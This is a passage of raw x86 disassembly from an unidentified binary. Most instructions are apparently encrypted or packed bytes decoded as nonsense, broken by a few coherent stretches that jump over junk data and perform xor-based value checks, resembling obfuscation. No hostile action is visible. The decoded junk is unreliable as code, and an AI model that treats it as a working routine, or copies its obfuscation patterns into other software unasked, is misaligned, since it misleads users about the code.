  40aeeb:	rcl    BYTE PTR ds:0xb971018f,cl
  40aef1:	sub    bh,dh
  40aef3:	loop   0x40af60
  40aef5:	mov    ah,0x27
  40aef7:	das    
  40aef8:	adc    al,0x12
  40aefa:	push   cs
  40aefb:	or     esi,DWORD PTR [ebx+eax*1-0x42bef5c6]
  40af02:	into   
  40af03:	push   ss
  40af04:	jmp    0x40aed7
  40af06:	adc    DWORD PTR [ebx],ecx
  40af08:	scas   eax,DWORD PTR es:[edi]
  40af09:	fld    QWORD PTR [edi-0x35e1181]
  40af0f:	ins    DWORD PTR es:[edi],dx
  40af10:	pop    esp
  40af11:	out    dx,eax
  40af12:	jae    0x40af25
  40af14:	es mov esp,0x130070bd
  40af1a:	mov    eax,0x6d629ac7
  40af1f:	pop    es
  40af20:	daa    
  40af21:	xchg   ebx,eax
  40af22:	mov    ah,0x1f
  40af24:	data16 out 0x23,al
  40af27:	daa    
  40af28:	jb     0x40af00
  40af2a:	mov    dh,ah
  40af2c:	scas   al,BYTE PTR es:[edi]
  40af2d:	inc    ebp
  40af2e:	in     eax,0xf1
  40af30:	dec    edi
  40af31:	push   es
  40af32:	in     eax,dx
  40af33:	jge    0x40af1f
  40af35:	mov    ah,0x62
  40af37:	mov    ds:0x1c49157,eax
  40af3c:	push   ebp
  40af3d:	jecxz  0x40af26
  40af3f:	into   
  40af40:	ror    BYTE PTR [edx+0x3d],cl
  40af43:	dec    ecx
  40af44:	mov    ds:0xb85bbc67,al
  40af49:	push   ebp
  40af4a:	cwde   
  40af4b:	mov    esi,0x138167dd
  40af50:	dec    DWORD PTR [edi-0x7]
  40af53:	push   edx
  40af54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af55:	(bad)  
  40af56:	iret   
  40af57:	rcr    DWORD PTR [ecx],1
  40af59:	and    BYTE PTR [esi],ch
  40af5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af5c:	loop   0x40af24
  40af5e:	mov    ebx,0x497febb8
  40af63:	sub    DWORD PTR [edx+eax*8],ebp
  40af66:	inc    edx
  40af67:	cmp    dh,BYTE PTR [ebx]
  40af69:	jns    0x40af3b
  40af6b:	and    DWORD PTR [eax+0x1e0f4ad0],edi
  40af71:	jl     0x40af05
  40af73:	add    cl,bl
  40af75:	fneni(8087 only) 
  40af77:	and    al,0x96
  40af79:	stos   DWORD PTR es:[edi],eax
  40af7a:	and    DWORD PTR gs:[eax],edx
  40af7d:	sbb    eax,0x18b5aa7
  40af82:	repz pop edx
  40af84:	adc    eax,ebp
  40af86:	fwait
  40af87:	mov    WORD PTR [edi],es
  40af89:	shl    BYTE PTR [esp+esi*1],1
  40af8c:	mov    al,ds:0x6ad18465
  40af91:	imul   ebx,eax,0xffffff87
  40af94:	ins    BYTE PTR es:[edi],dx
  40af95:	iret   
  40af96:	stos   BYTE PTR es:[edi],al
  40af97:	cmp    esp,DWORD PTR [esi*1-0x6a755e6d]
  40af9e:	mov    al,al
  40afa0:	dec    esi
  40afa1:	dec    esp
  40afa2:	xchg   esi,eax
  40afa3:	xchg   ebp,eax
  40afa4:	pop    edx
  40afa5:	jmp    0x44212e86
  40afaa:	fadd   DWORD PTR [edx]
  40afac:	adc    al,BYTE PTR [eax+0x46bb3f34]
  40afb2:	es xchg ebx,eax
  40afb4:	xchg   BYTE PTR [eax+0xe],dh
  40afb7:	add    eax,0x909b4f26
  40afbc:	dec    ecx
  40afbd:	jo     0x40af86
  40afbf:	mov    edi,0x13961b1d
  40afc4:	clc    
  40afc5:	jmp    0x40afcd
  40afc7:	push   ebp
  40afc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40afc9:	and    eax,DWORD PTR [ecx-0x7691c7a5]
  40afcf:	pop    ebp
  40afd0:	hlt    
  40afd1:	mov    eax,DWORD PTR [eax]
  40afd3:	mov    cx,WORD PTR [ebp-0x4]
  40afd7:	movzx  ecx,cx
  40afda:	add    ecx,DWORD PTR [eax]
  40afdc:	mov    DWORD PTR [ebp-0x14],0xf89c853d
  40afe3:	mov    DWORD PTR [ebp-0x1c],ecx
  40afe6:	jmp    0x40b333
  40afeb:	js     0x40b055
  40afed:	adc    ebp,ebx
  40afef:	jae    0x40b062
  40aff1:	loopne 0x40b05c
  40aff3:	lfs    esi,FWORD PTR [edx]
  40aff6:	or     bh,BYTE PTR [ecx+0x7944f413]
  40affc:	call   0x7d6f2e7f
  40b001:	jle    0x40b081
  40b003:	outs   dx,BYTE PTR ds:[esi]
  40b004:	xlat   BYTE PTR ds:[ebx]
  40b005:	(bad)  
  40b006:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b007:	nop
  40b008:	test   cl,cl
  40b00a:	xlat   BYTE PTR ds:[ebx]
  40b00b:	ss pop ebp
  40b00d:	add    al,0xfb
  40b00f:	leave  
  40b010:	and    eax,0xd0fdf984
  40b015:	cmp    eax,0xcc8ac5fd
  40b01a:	add    eax,DWORD PTR [esp+edi*2]
  40b01d:	enter  0xf71c,0x5b
  40b021:	mov    bh,0xb5
  40b023:	jb     0x40afe2
  40b025:	inc    edi
  40b026:	out    0x96,al
  40b028:	fisttp QWORD PTR [ebx]
  40b02a:	out    dx,eax
  40b02b:	icebp  
  40b02c:	mov    al,ds:0xcf35add2
  40b031:	test   al,0xc6
  40b033:	dec    ebx
  40b034:	call   0xdd1b969a
  40b039:	int3   
  40b03a:	sub    BYTE PTR [edx],0xa0
  40b03d:	or     al,0x3b
  40b03f:	bnd jge 0x40b07a
  40b042:	or     dl,BYTE PTR [edx]
  40b044:	fist   WORD PTR [ebp+0x2782a5a8]
  40b04a:	sbb    eax,0x1db31038
  40b04f:	out    dx,eax
  40b050:	dec    eax
  40b051:	or     al,0x9d
  40b053:	nop
  40b054:	or     ebp,DWORD PTR gs:0xe6bfe29d
  40b05b:	jl     0x40b0da
  40b05d:	shl    DWORD PTR [ebx-0x46b29ca7],0x1e
  40b064:	jg     0x40b041
  40b066:	icebp  
  40b067:	push   es
  40b068:	je     0x40b03c
  40b06a:	ret    
  40b06b:	jge    0x40b031
  40b06d:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40b06f:	xor    DWORD PTR [esp+eax*8-0x453dc2aa],ebp
  40b076:	sbb    bh,BYTE PTR [edx-0x78d1325b]
  40b07c:	jns    0x40b0cc
  40b07e:	add    ebx,DWORD PTR [edi+esi*4+0x491d49d8]
  40b085:	adc    BYTE PTR [ebp-0x43],dh
  40b088:	sbb    dl,BYTE PTR [ebx-0x2a0a0a56]
  40b08e:	dec    ebp
  40b08f:	add    ebx,DWORD PTR [ebx+edi*1-0x44a53c7d]
  40b096:	shr    BYTE PTR [edi*1-0x6ae5b937],cl
  40b09d:	popf   
  40b09e:	or     cl,BYTE PTR ds:0xba7d81d
  40b0a4:	retf   
  40b0a5:	pop    edx
  40b0a6:	scas   al,BYTE PTR es:[edi]
  40b0a7:	das    
  40b0a8:	sbb    BYTE PTR ds:0xc78bcf0e,ch
  40b0ae:	pusha  
  40b0af:	(bad)  
  40b0b0:	loope  0x40b0e8
  40b0b2:	mov    al,ds:0x9954d83e
  40b0b7:	push   esp
  40b0b8:	fistp  DWORD PTR [ebp-0x62]
  40b0bb:	inc    edx
  40b0bc:	setp   dl
  40b0bf:	mov    eax,ds:0x98bd4779
  40b0c4:	sbb    al,0xe
  40b0c6:	xchg   esi,eax
  40b0c7:	icebp  
  40b0c8:	(bad)  
  40b0c9:	push   ds
  40b0ca:	mov    eax,ds:0xd4a610e2
  40b0cf:	xor    cl,BYTE PTR [esi]
  40b0d1:	push   eax
  40b0d2:	fcmovu st,st(7)
  40b0d4:	std    
  40b0d5:	fadd   QWORD PTR [ebx+eiz*4-0x2b]
  40b0d9:	cmc    
  40b0da:	aaa    
  40b0db:	sub    dh,cl
  40b0dd:	std    
  40b0de:	imul   ebx,DWORD PTR [ecx+0x5c514bae],0xdd519737
  40b0e8:	sti    
  40b0e9:	in     al,0xe4
  40b0eb:	sbb    DWORD PTR [ebp-0x38f1756f],edx
  40b0f1:	mov    ch,0x5c
  40b0f3:	pop    esi
  40b0f4:	ja     0x40b07d
  40b0f6:	pop    es
  40b0f7:	and    ebp,ebx
  40b0f9:	out    0xa8,eax
  40b0fb:	cmp    BYTE PTR [ecx+0x42dd4230],al
  40b101:	in     eax,0xa6
  40b103:	mov    esi,0xfdccd993
  40b108:	je     0x40b171
  40b10a:	ss inc eax
  40b10c:	xchg   edx,eax
  40b10d:	test   eax,0x6598b78
  40b112:	(bad)  
  40b113:	lods   al,BYTE PTR ds:[esi]
  40b114:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b115:	mov    eax,ds:0x76b48ecc
  40b11a:	lods   al,BYTE PTR ds:[esi]
  40b11b:	into   
  40b11c:	jne    0x40b13b
  40b11e:	bound  edx,QWORD PTR [eax+0x4]
  40b121:	mov    edi,0x9e00ab1a
  40b126:	push   esp
  40b127:	(bad)  
  40b128:	mov    esi,0xcbb1485d
  40b12d:	sbb    ecx,DWORD PTR [edx]
  40b12f:	sub    edi,DWORD PTR [edx-0x5c]
  40b132:	jo     0x40b122
  40b134:	in     eax,dx
  40b135:	jmp    0x978b2eac
  40b13a:	pop    ss
  40b13b:	mov    ch,0xb5
  40b13d:	clc    
  40b13e:	aaa    
  40b13f:	jmp    0x7f82:0x2f2386e5
  40b146:	sub    bh,BYTE PTR gs:[edi-0x23]
  40b14a:	mov    esp,0x11be03ce
  40b14f:	mov    esp,0x7e510e73
  40b154:	and    edi,DWORD PTR [eax]
  40b156:	dec    ecx
  40b157:	dec    esi
  40b158:	adc    dh,cl
  40b15a:	stos   BYTE PTR es:[edi],al
  40b15b:	lods   eax,DWORD PTR ds:[esi]
  40b15c:	aam    0xbe
  40b15e:	push   0xd4b63a34
  40b163:	jle    0x40b118
  40b165:	mov    eax,ds:0x671538a9
  40b16a:	pop    edi
  40b16b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b16c:	cdq    
  40b16d:	push   es
  40b16e:	std    
  40b16f:	or     esi,DWORD PTR [edi]
  40b171:	mov    eax,0xa6e23e31
  40b176:	cmc    
  40b177:	add    bl,BYTE PTR [esi-0x18]
  40b17a:	pop    eax
  40b17b:	or     DWORD PTR [bp+si-0x9b7],eax
  40b180:	jbe    0x40b1f5
  40b182:	(bad)  
  40b183:	ficomp WORD PTR [ebp-0x56]
  40b186:	ret    
  40b187:	pop    eax
  40b188:	retf   0xe5b7
  40b18b:	mov    al,0x46
  40b18d:	je     0x40b1f4
  40b18f:	push   edi
  40b190:	push   esi
  40b191:	xchg   edx,eax
  40b192:	mov    ds:0x53eddd48,al
  40b197:	inc    eax
  40b198:	daa    
  40b199:	out    dx,al
  40b19a:	sub    al,0xe
  40b19c:	push   edi
  40b19d:	inc    edi
  40b19e:	mov    esi,0x84538bd
  40b1a3:	sbb    esi,DWORD PTR [edx-0x5f4c1407]
  40b1a9:	pop    edx
  40b1aa:	xrelease mov BYTE PTR ds:0x7370eb71,0xc8
  40b1b2:	arpl   dx,sp
  40b1b4:	adc    eax,0xf06d54b1
  40b1b9:	loope  0x40b184
  40b1bb:	xlat   BYTE PTR ds:[ebx]
  40b1bc:	fidivr DWORD PTR [edi+0x625e5818]
  40b1c2:	dec    edi
  40b1c3:	aam    0x99
  40b1c5:	ins    BYTE PTR es:[edi],dx
  40b1c6:	clc    
  40b1c7:	push   0x6f
  40b1c9:	dec    eax
  40b1ca:	pop    ecx
  40b1cb:	cmp    cl,bl
  40b1cd:	dec    eax
  40b1ce:	(bad)  
  40b1cf:	dec    esi
  40b1d0:	in     eax,dx
  40b1d1:	mov    bh,BYTE PTR [ecx-0x37]
  40b1d4:	les    esp,FWORD PTR [edx]
  40b1d6:	lahf   
  40b1d7:	test   BYTE PTR [ecx+0x18],al
  40b1da:	ss xor al,0xef
  40b1dd:	into   
  40b1de:	sar    ecx,cl
  40b1e0:	test   bh,ch
  40b1e2:	and    BYTE PTR [edx-0x30],bl
  40b1e5:	mov    cl,0x7
  40b1e7:	push   edx
  40b1e8:	aam    0x54
  40b1ea:	xchg   edi,eax
  40b1eb:	pop    DWORD PTR [ebp+0x35]
  40b1ee:	add    bl,ch
  40b1f0:	pushf  
  40b1f1:	mov    ch,BYTE PTR [ebx-0x1c45df58]
  40b1f7:	mov    ecx,0x3ab5d02c
  40b1fc:	pop    edx
  40b1fd:	xchg   esi,eax
  40b1fe:	dec    esi
  40b1ff:	adc    eax,0xc1811e36
  40b204:	xor    eax,0xe855d9a3
  40b209:	pop    es
  40b20a:	xchg   sp,ax
  40b20c:	mov    edx,DWORD PTR [esi+eiz*1]
  40b20f:	xor    DWORD PTR [esp+eax*4-0x4a],eax
  40b213:	imul   DWORD PTR [eax]
  40b215:	jo     0x40b283
  40b217:	jnp    0x40b1b7
  40b219:	add    dl,al
  40b21b:	pusha  
  40b21c:	repz inc ebx
  40b21e:	and    edx,ebx
  40b220:	cdq    
  40b221:	push   ss
  40b222:	push   edi
  40b223:	repz mov ds:0x36692f30,al
  40b229:	into   
  40b22a:	stc    
  40b22b:	sar    BYTE PTR [eax+0x726a6f3a],0x4
  40b232:	inc    eax
  40b233:	jmp    0x40b238
  40b235:	sub    ebx,DWORD PTR [ecx-0x6f]
  40b238:	into   
  40b239:	pop    ecx
  40b23a:	call   0xeb4997a0
  40b23f:	cmp    DWORD PTR ds:0x177b45b1,eax
  40b245:	das    
  40b246:	shl    DWORD PTR [esi],1
  40b248:	les    ebx,FWORD PTR ds:0x397ad502
  40b24e:	jg     0x40b215
  40b250:	push   edx
  40b251:	cmp    eax,DWORD PTR [esi]
  40b253:	rol    DWORD PTR [esi-0x71],1
  40b256:	daa    
  40b257:	adc    ecx,eax
  40b259:	mov    esp,0x11b80023
  40b25e:	test   dh,cl
  40b260:	je     0x40b276
  40b262:	popa   
  40b263:	test   eax,0x1e9aa34a
  40b268:	cli    
  40b269:	pop    ss
  40b26a:	or     BYTE PTR [eax+ecx*1],bl
  40b26d:	pop    ss
  40b26e:	sbb    ebp,ecx
  40b270:	inc    ebp
  40b271:	test   eax,0xa82c17ab
  40b276:	mov    BYTE PTR [ebx+0x34fb3916],ah
  40b27c:	lods   eax,DWORD PTR ds:[esi]
  40b27d:	(bad)  
  40b27e:	jmp    0x40b219
  40b280:	ror    ebx,0x14
  40b283:	arpl   WORD PTR [edx+0x4226d469],sp
  40b289:	push   es
  40b28a:	cmc    
  40b28b:	rcl    ebp,cl
  40b28d:	jp     0x40b2c8
  40b28f:	rcl    BYTE PTR [ebx+0x32],cl
  40b292:	pop    ss
  40b293:	sbb    eax,0x5c39414a
  40b298:	mov    ebx,0x7fab4f4e
  40b29d:	cmp    ebx,esp
  40b29f:	or     bl,bl
  40b2a1:	inc    esi
  40b2a2:	mov    BYTE PTR [ebx-0xb9e37e5],dl
  40b2a8:	mov    bl,0xb0
  40b2aa:	in     al,0x9c
  40b2ac:	cmp    BYTE PTR [ebp+0x12],bh
  40b2af:	jnp    0x40b2ae
  40b2b1:	imul   edx,DWORD PTR [esi-0x73],0x54
  40b2b5:	lods   eax,DWORD PTR ds:[esi]
  40b2b6:	sar    DWORD PTR [esi],0x62
  40b2b9:	cmp    al,0xc
  40b2bb:	xor    eax,0xe21cbb61
  40b2c0:	int3   
  40b2c1:	adc    eax,0xe3f77a54
  40b2c6:	gs ret 
  40b2c8:	cmp    ebx,ebp
  40b2ca:	fist   DWORD PTR [ebp+0x1b]
  40b2cd:	cli    
  40b2ce:	jno    0x40b33d
  40b2d0:	es push ss
  40b2d2:	xchg   ecx,eax
  40b2d3:	sbb    esi,DWORD PTR [ecx-0x589812e8]
  40b2d9:	cli    
  40b2da:	imul   ebx,edx,0xffffffbb
  40b2dd:	scas   al,BYTE PTR es:[edi]
  40b2de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b2df:	xchg   ebp,eax
  40b2e0:	sub    eax,0x418987c2
  40b2e5:	fisubr DWORD PTR [esi-0x20]
  40b2e8:	addr16 sub al,0x64
  40b2eb:	lahf   
  40b2ec:	xchg   edx,eax
  40b2ed:	push   ebx
  40b2ee:	loope  0x40b314
  40b2f0:	data16 fdivr DWORD PTR [ecx+0x931d816]
  40b2f7:	out    dx,al
  40b2f8:	inc    ebx
  40b2f9:	(bad)  
  40b2fb:	imul   ecx,DWORD PTR [ebp+0x5f],0x707850ab
  40b302:	test   DWORD PTR [edx+0x5c7fca2b],esp
  40b308:	sbb    dh,al
  40b30a:	mov    cl,0xaf
  40b30c:	adc    BYTE PTR [eax+0x651c89],bh
  40b312:	push   ebx
  40b313:	cmp    DWORD PTR [edx+0x57],esi
  40b316:	cld    
  40b317:	mov    al,ds:0x66c9981a
  40b31c:	sahf   
  40b31d:	sbb    DWORD PTR [ebx+0x382c1f0b],ebp
  40b323:	sub    BYTE PTR ds:0x3dbdd04,0x5e
  40b32a:	mov    ah,0x90
  40b32c:	jnp    0x40b2e3
  40b32e:	test   eax,0x28cee877
  40b333:	mov    eax,DWORD PTR [ebp+0x8]
  40b336:	mov    ecx,DWORD PTR [ebp-0x8]
  40b339:	xor    eax,esi
  40b33b:	add    eax,edi
  40b33d:	cmp    DWORD PTR [ecx],eax
  40b33f:	jne    0x40c44a
  40b345:	mov    eax,DWORD PTR [ebp+0x8]
  40b348:	mov    ecx,DWORD PTR [ebp-0x1c]
  40b34b:	xor    eax,esi
  40b34d:	add    eax,edi
  40b34f:	cmp    DWORD PTR [ecx],eax
  40b351:	jne    0x40b6c1
  40b357:	mov    eax,DWORD PTR [ebp+0x8]
  40b35a:	mov    ecx,DWORD PTR [ebp-0x10]
  40b35d:	xor    eax,esi
  40b35f:	add    eax,edi
  40b361:	mov    DWORD PTR [ecx],eax
  40b363:	jmp    0x40b6b0
  40b368:	cmp    eax,0xe9fdcd2a
  40b36d:	pop    ecx
  40b36e:	dec    ebp
  40b36f:	push   0x46
  40b371:	aam    0xcc
  40b373:	int3   
  40b374:	jne    0x40b33d
  40b376:	retf   
  40b377:	into   
  40b378:	sub    edi,esi
  40b37a:	jle    0x40b3fa
  40b37c:	cs jge 0x40b3fd
  40b37f:	jle    0x40b357
  40b381:	dec    esi
  40b382:	lds    esi,FWORD PTR [edi-0x6b800d0a]
  40b388:	fsub   st(4),st
  40b38a:	jno    0x40b319
  40b38c:	out    0xc3,eax
  40b38e:	fwait
  40b38f:	and    edi,edx
  40b391:	or     dh,BYTE PTR [ebx+ecx*8+0x70]
  40b395:	mov    WORD PTR [ebx],?
  40b397:	repz pop ecx
  40b399:	mov    esp,0x8cc7a204
  40b39e:	test   bh,dl
  40b3a0:	(bad)  
  40b3a1:	sbb    eax,edi
  40b3a3:	and    eax,0x5963ab85
  40b3a8:	sub    BYTE PTR [ebx],ah
  40b3aa:	pop    ebp
  40b3ab:	xor    dl,al
  40b3ad:	lods   al,BYTE PTR ds:[esi]
  40b3ae:	das    
  40b3af:	fwait
  40b3b0:	xor    ch,BYTE PTR [ebx-0x44]
  40b3b3:	mov    BYTE PTR gs:[ebx],bl
  40b3b6:	jge    0x40b35f
  40b3b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b3b9:	mov    BYTE PTR [eax+0x2f1f7f6],al
  40b3bf:	aad    0x40
  40b3c1:	test   eax,0xd479bad2
  40b3c6:	sub    al,BYTE PTR [ebp+0x72a5810b]
  40b3cc:	push   edi
  40b3cd:	add    al,0x32
  40b3cf:	clc    
  40b3d0:	shr    BYTE PTR [ebp-0x65d79b83],0x9a
  40b3d7:	cmc    
  40b3d8:	xchg   BYTE PTR [esi+ebx*1+0x61279195],cl
  40b3df:	sar    BYTE PTR [edi-0x4a],cl
  40b3e2:	fwait
  40b3e3:	out    0x5,al
  40b3e5:	or     dl,cl
  40b3e7:	gs enter 0x54cc,0xed
  40b3ec:	xchg   edi,eax
  40b3ed:	push   ss
  40b3ee:	sub    eax,0xe579c679
  40b3f3:	imul   ecx,DWORD PTR [esi],0x6b
  40b3f6:	mov    edx,0xf5b66f56
  40b3fb:	cmp    al,0x5e
  40b3fd:	loop   0x40b3c6
  40b3ff:	and    al,al
  40b401:	sub    esi,DWORD PTR [ebx+0x7a]
  40b404:	fs push cs
  40b406:	push   ebx
  40b407:	fsub   QWORD PTR [ecx-0x4ca27670]
  40b40d:	(bad)  
  40b40e:	jbe    0x40b3d3
  40b410:	cmp    DWORD PTR [ebp-0x6afc28aa],edx
  40b416:	push   ss
  40b417:	mov    ds:0x8565bc91,eax
  40b41c:	cmp    al,0x67
  40b41e:	idiv   BYTE PTR ds:0xd0343e7b
  40b424:	jl     0x40b3b7
  40b426:	pop    ss
  40b427:	jae    0x40b3ff
  40b429:	push   cs
  40b42a:	aaa    
  40b42b:	ja     0x40b3cc
  40b42d:	sub    al,0xa6
  40b42f:	jbe    0x40b48c
  40b431:	fdivr  QWORD PTR [edi-0x65d41fde]
  40b437:	fwait
  40b438:	retf   0x12f2
  40b43b:	ja     0x40b487
  40b43d:	sub    ecx,DWORD PTR [eax+0x63]
  40b440:	mov    esp,0x6e65ec8b
  40b445:	rol    BYTE PTR [ecx-0x2c16c741],0x9a
  40b44c:	ror    DWORD PTR [ebx],0xee
  40b44f:	push   edx
  40b450:	pop    edx
  40b451:	retf   
  40b452:	int3   
  40b453:	mov    esp,0x2bcdd2ed
  40b458:	xchg   edx,eax
  40b459:	jmp    0xb854:0xe1ee0241
  40b460:	mov    ebx,0x8c7eb1e5
  40b465:	and    eax,0xf4f737a7
  40b46a:	or     ebx,DWORD PTR [ebx-0x79fae2e1]
  40b470:	or     edx,ebp
  40b472:	jns    0x40b496
  40b474:	and    ecx,DWORD PTR [ecx]
  40b476:	mov    bl,0x49
  40b478:	jbe    0x40b462
  40b47a:	(bad)  
  40b47b:	cmp    ch,BYTE PTR [ecx]
  40b47d:	jl     0x40b45b
  40b47f:	ror    BYTE PTR [ebp-0x6a],0xb9
  40b483:	(bad)  
  40b484:	cmp    ebx,DWORD PTR [ebx]
  40b486:	xchg   ebx,eax
  40b487:	xor    esi,DWORD PTR [ecx]
  40b489:	mov    BYTE PTR [edx-0x7c799744],bl
  40b48f:	loopne 0x40b451
  40b491:	xor    ch,ch
  40b493:	dec    edx
  40b494:	push   ss
  40b495:	inc    edi
  40b496:	aas    
  40b497:	push   esi
  40b498:	icebp  
  40b499:	rcr    DWORD PTR [edx-0x3c],0x37
  40b49d:	shr    BYTE PTR [ebp+esi*4+0x46c1016e],1
  40b4a4:	dec    ecx
  40b4a5:	or     BYTE PTR ds:0x76526bd0,0x7f
  40b4ac:	mov    DWORD PTR [esi+0x40139a4a],edx
  40b4b2:	jmp    0x6395:0x25ccdd53
  40b4b9:	scas   eax,DWORD PTR es:[edi]
  40b4ba:	jnp    0x40b497
  40b4bc:	add    ah,bh
  40b4be:	lock jae 0x40b530
  40b4c1:	add    edi,ebx
  40b4c3:	popa   
  40b4c4:	fwait
  40b4c5:	and    esi,DWORD PTR [esi-0x3c690cf4]
  40b4cb:	shl    BYTE PTR [ebx-0x79],1
  40b4ce:	outs   dx,DWORD PTR ds:[esi]
  40b4cf:	stos   BYTE PTR es:[edi],al
  40b4d0:	push   edi
  40b4d1:	hlt    
  40b4d2:	sbb    DWORD PTR [ebx],edi
  40b4d4:	sub    al,0x24
  40b4d6:	sbb    DWORD PTR ds:0x4f688a6,0xffffffa6
  40b4dd:	sbb    al,0x34
  40b4df:	scas   eax,DWORD PTR es:[di]
  40b4e1:	sub    esp,ecx
  40b4e3:	loop   0x40b562
  40b4e5:	stos   DWORD PTR es:[edi],eax
  40b4e6:	ja     0x40b4e5
  40b4e8:	pushf  
  40b4e9:	rcr    esp,cl
  40b4eb:	arpl   di,bx
  40b4ed:	enter  0xdedd,0xd8
  40b4f1:	pop    ebp
  40b4f2:	fnsave [ebp+esi*2-0x46c03eb8]
  40b4f9:	mov    bl,0x66
  40b4fb:	pop    eax
  40b4fc:	out    dx,eax
  40b4fd:	xchg   ecx,eax
  40b4fe:	call   0x1f96:0xdd73f97c
  40b505:	daa    
  40b506:	arpl   di,si
  40b508:	sahf   
  40b509:	or     al,0x22
  40b50b:	sbb    eax,ebx
  40b50d:	jle    0x40b500
  40b50f:	push   ecx
  40b510:	push   eax
  40b511:	mov    ebp,0x16693cf7
  40b516:	or     edx,ebp
  40b518:	mov    ebx,esp
  40b51a:	push   ebx
  40b51b:	and    bh,dl
  40b51d:	aam    0x77
  40b51f:	fist   WORD PTR [esi+0xf]
  40b522:	mov    ds:0x11d0ffc8,eax
  40b527:	call   0x7374aa92
  40b52c:	aam    0x98
  40b52e:	(bad)
  40b533:	mov    cl,0x70
  40b535:	add    DWORD PTR [edx],ecx
  40b537:	fstp   DWORD PTR [ecx-0x41]
  40b53a:	es popf 
  40b53c:	mov    edx,DWORD PTR [edi]
  40b53e:	cli    
  40b53f:	(bad)  
  40b540:	dec    esi
  40b541:	scas   eax,DWORD PTR es:[edi]
  40b542:	or     eax,0x2ed2bd00
  40b547:	pop    ecx
  40b548:	test   BYTE PTR [edi],dl
  40b54a:	aad    0x78
  40b54c:	ret    0xcd7a
  40b54f:	xchg   esi,eax
  40b550:	sahf   
  40b551:	in     al,0x5d
  40b553:	or     BYTE PTR [eax],al
  40b555:	sub    DWORD PTR [ebx-0x5a],ebx
  40b558:	dec    edi
  40b559:	mov    ah,0xed
  40b55b:	dec    esi
  40b55c:	jns    0x40b4f0
  40b55e:	scas   eax,DWORD PTR es:[edi]
  40b55f:	fistp  QWORD PTR [ebp+0x395d9e92]
  40b565:	inc    esp
  40b566:	mov    dl,0x66
  40b568:	jae    0x40b560
  40b56a:	jns    0x40b574
  40b56c:	in     eax,0xa
  40b56e:	adc    DWORD PTR [ecx+0x59403ef8],ecx
  40b574:	(bad)  
  40b576:	loop   0x40b5c1
  40b578:	call   0x77c4:0xb02489e2
  40b57f:	inc    edi
  40b580:	inc    edi
  40b581:	or     ecx,esi
  40b583:	(bad)  
  40b584:	adc    al,dh
  40b586:	sbb    BYTE PTR ds:0x12eb6759,0x3f
  40b58d:	add    ecx,0x109b7f3a
  40b593:	jmp    DWORD PTR [ecx+0x76]
  40b596:	adc    edx,DWORD PTR [ebx-0x63]
  40b599:	nop
  40b59a:	adc    ebx,DWORD PTR [edx]
  40b59c:	add    ecx,ebx
  40b59e:	dec    ebx
  40b59f:	xchg   esp,eax
  40b5a0:	cmp    BYTE PTR [esi+0x2a4589bf],al
  40b5a6:	aas    
  40b5a7:	das    
  40b5a8:	jecxz  0x40b5ac
  40b5aa:	xchg   bx,ax
  40b5ac:	mov    ebx,0xf5a6a295
  40b5b1:	xor    al,0x5f
  40b5b3:	mov    esi,DWORD PTR [esi+0x15]
  40b5b6:	out    0x77,eax
  40b5b8:	lods   al,BYTE PTR ds:[esi]
  40b5b9:	and    DWORD PTR ds:0xf190c88e,ecx
  40b5bf:	mov    al,0x42
  40b5c1:	es pop ebp
  40b5c3:	(bad)  
  40b5c4:	push   ebx
  40b5c5:	mov    ebx,0xb9873eb
  40b5ca:	nop
  40b5cb:	adc    eax,ebp
  40b5cd:	sub    ecx,0x59033a3d
  40b5d3:	test   BYTE PTR ds:0x201937d8,0x64
  40b5da:	lods   eax,DWORD PTR ds:[esi]
  40b5db:	or     DWORD PTR [ecx+edx*8],esp
  40b5de:	jl     0x40b632
  40b5e0:	jp     0x40b5c3
  40b5e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b5e3:	add    al,al
  40b5e5:	(bad)  
  40b5e6:	mov    dl,0xd
  40b5e8:	xlat   BYTE PTR ds:[ebx]
  40b5e9:	push   ebx
  40b5ea:	and    eax,0xa5f2d312
  40b5ef:	dec    edi
  40b5f0:	out    0xc8,al
  40b5f2:	mov    edx,0x29e0fdff
  40b5f7:	outs   dx,BYTE PTR ds:[esi]
  40b5f8:	test   eax,0x3f1ae243
  40b5fd:	sar    DWORD PTR cs:[ecx+0x62],1
  40b601:	repz pop ebx
  40b603:	rcr    DWORD PTR [edi+eiz*1],cl
  40b606:	adc    eax,0x56492640
  40b60b:	and    ah,cl
  40b60d:	call   0xa941:0x9dbd7b40
  40b614:	xchg   ecx,eax
  40b615:	js     0x40b5b2
  40b617:	stos   DWORD PTR es:[edi],eax
  40b618:	aam    0x9
  40b61a:	xor    DWORD PTR [eax+eax*1-0x72efd3cc],0xffffffd4
  40b622:	mov    ebx,0x3ecea750
  40b627:	push   eax
  40b628:	(bad)  
  40b629:	jmp    0x59e38213
  40b62e:	jmp    FWORD PTR [ebx+0x4a7fde6d]
  40b634:	fisttp WORD PTR [ecx+ecx*4+0x6b]
  40b638:	xor    DWORD PTR [ecx],ecx
  40b63a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b63b:	js     0x40b5fe
  40b63d:	push   ebp
  40b63e:	jmp    0x40b656
  40b640:	fcom   DWORD PTR ds:0x64345a03
  40b646:	mov    WORD PTR [edx-0xf],cs
  40b649:	mov    esp,0x1441259b
  40b64e:	test   DWORD PTR [edx],esi
  40b650:	in     eax,dx
  40b651:	sbb    BYTE PTR ds:0xd2ed035,dh
  40b657:	pushf  
  40b658:	les    eax,FWORD PTR [esp+eiz*8-0x1e295353]
  40b65f:	mov    fs:0xc619d49f,eax
  40b665:	std    
  40b666:	rcr    DWORD PTR [eax],1
  40b668:	mov    BYTE PTR [ecx-0x133b7800],bh
  40b66e:	pop    ecx
  40b66f:	je     0x40b6b8
  40b671:	add    bh,dl
  40b673:	cmp    edx,ebx
  40b675:	imul   esp,edi,0x2a93f6e4
  40b67b:	jl     0x40b6d5
  40b67d:	and    DWORD PTR [ecx+0x289d7e40],ebp
  40b683:	xchg   ecx,eax
  40b684:	push   es
  40b685:	inc    ebx
  40b686:	inc    ebx
